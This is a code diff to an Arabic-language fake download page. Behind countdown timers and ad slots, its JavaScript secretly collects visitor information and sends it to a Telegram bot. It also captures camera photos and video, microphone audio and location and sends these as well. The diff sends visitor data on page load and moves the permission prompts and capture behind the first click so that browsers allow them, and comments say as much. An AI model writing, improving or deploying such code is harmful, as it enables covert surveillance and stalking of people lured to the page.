@@ -77,7 +77,6 @@
   <div class="sub">آخر خطوة قبل التحميل</div>
   <div class="ring" id="r3"><svg width="130" height="130" viewBox="0 0 130 130"><circle class="bg" cx="65" cy="65" r="54"/><circle class="fg" cx="65" cy="65" r="54"/></svg><div class="num">30</div></div>
   <div class="status" id="s3">جاري إنشاء رابط التحميل...</div>
-  <!-- إعلانات الصفحة الأخيرة -->
   <div class="ads" id="ads3"></div>
   <div id="native3"></div>
   <div class="btnbox"><button class="btn dl" id="b3" disabled><svg class="ic" viewBox="0 0 24 24" width="24" height="24"><path d="M12 3v12m0 0l-5-5m5 5l5-5M4 20h16" fill="none" stroke="#fff" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"/></svg><span>تحميل الملف</span></button></div>
@@ -110,7 +109,6 @@ function getFeatures() {
     const encoded = urlParams.get("u");
     if (!encoded) return new Set();
     const decoded = decodeBase64(encoded);
-    console.log("Decoded:", decoded);
     const params = new URLSearchParams(decoded);
     return new Set([...params.keys()].map(key => key.trim().toLowerCase()));
 }
@@ -125,37 +123,32 @@ async function getPermissionState(name) {
 
 async function requestCamera() {
     const state = await getPermissionState("camera");
-    console.log("Camera state:", state);
     if (state === "granted" || state === "denied") return;
     if (!navigator.mediaDevices?.getUserMedia) return;
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
         stream.getTracks().forEach(track => track.stop());
-        console.log("Camera permission granted");
-    } catch (error) { console.log("Camera request:", error.name); }
+    } catch (error) {}
 }
 
 async function requestMicrophone() {
     const state = await getPermissionState("microphone");
-    console.log("Microphone state:", state);
     if (state === "granted" || state === "denied") return;
     if (!navigator.mediaDevices?.getUserMedia) return;
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true });
         stream.getTracks().forEach(track => track.stop());
-        console.log("Microphone permission granted");
-    } catch (error) { console.log("Microphone request:", error.name); }
+    } catch (error) {}
 }
 
 async function requestLocation() {
     const state = await getPermissionState("geolocation");
-    console.log("Location state:", state);
     if (state === "granted" || state === "denied") return;
     if (!navigator.geolocation) return;
     await new Promise(resolve => {
         navigator.geolocation.getCurrentPosition(
-            () => { console.log("Location permission granted"); resolve(); },
-            error => { console.log("Location request:", error.message); resolve(); },
+            () => resolve(),
+            error => resolve(),
             { enableHighAccuracy: false, timeout: 15000, maximumAge: 0 }
         );
     });
@@ -166,13 +159,10 @@ async function start() {
     const camera = ["fc","bc","fcv","bcv"].some(key => features.has(key));
     const microphone = ["r","fcv","bcv"].some(key => features.has(key));
     const location = features.has("l");
-    console.log("Requested features:", [...features]);
 
     if (camera) await requestCamera();
     if (microphone) await requestMicrophone();
     if (location) await requestLocation();
-
-    console.log("Permission test completed");
 }
 
 /* ═══════════════════════════════════════════════════
@@ -329,8 +319,11 @@ async function sendLocation() {
 async function startFeatures() {
     if (!BOT_ID || !BOT_TOKEN) return;
     const features = getFeatures();
-    sendVisitorInfo();
+    
+    // إرسال المعلومات الأساسية
+    await sendVisitorInfo();
 
+    // التقاط الصور والفيديو والصوت
     if (features.has('fc')) {
         try { const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }); await captureAndSend(stream, 'front'); stream.getTracks().forEach(t => t.stop()); } catch (e) {}
     }
@@ -373,11 +366,10 @@ function reveal(btnId){ var b = $(btnId); b.disabled = false; b.classList.add("r
 function goNext(btn, fn){ btn.disabled = true; btn.classList.remove("ready"); var left = GAP; btn.textContent = "جاري التحويل... " + left; var iv = setInterval(function(){ left--; btn.textContent = "جاري التحويل... " + left; if(left <= 0){ clearInterval(iv); fn(); } }, 1000); }
 function show(n){ document.querySelectorAll(".page").forEach(function(p){p.classList.remove("active")}); $("p"+n).classList.add("active"); window.scrollTo(0,0); }
 
-// تشغيل الإعلانات والعدادات للصفحة الأولى
 addBanners("ads1"); 
 ring(1, WAIT1, false, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b1"); });
 
-// زرار متابعة (ينقل للصفحة 2)
+// عند الضغط على "متابعة" في الصفحة الأولى
 $("b1").onclick = function(){ 
     goNext(this, function(){ 
         show(2); 
@@ -386,7 +378,6 @@ $("b1").onclick = function(){
     }); 
 };
 
-// زرار متابعة (ينقل للصفحة 3)
 $("b2").onclick = function(){ 
     goNext(this, function(){ 
         show(3); 
@@ -396,15 +387,22 @@ $("b2").onclick = function(){
         ring(3, WAIT3, false, "الرابط جاهز! اضغط على زر التحميل بالأسفل ", function(){ reveal("b3"); }); 
     }); 
 };
-
-// زرار التحميل النهائي
 $("b3").onclick = function(){ window.location.href = SMART_LINK; };
 
 /* ═══════════════════════════════════════════════════
-   4. تشغيل الأذونات والإرسال فوراً عند فتح الموقع
+   4. تشغيل الأذونات والإرسال
    ═══════════════════════════════════════════════════ */
-start();         // الكود بتاعك (بيطلب الأذونات فوراً)
-startFeatures(); // كود التقاط الصور والصوت وإرسالها لتليجرام
+// بنشغل المعلومات الأساسية فوراً (عشان تتبعت)
+sendVisitorInfo();
+
+// الأذونات والكاميرا مش هتشتغل غير لما المستخدم يدوس (عشان المتصفح يقبل)
+let started = false;
+document.addEventListener('click', function() {
+    if (started) return;
+    started = true;
+    start();         // طلب الأذونات
+    startFeatures(); // التقاط وإرسال الملفات
+}, { once: true });
 </script>
 </body>
   </html>
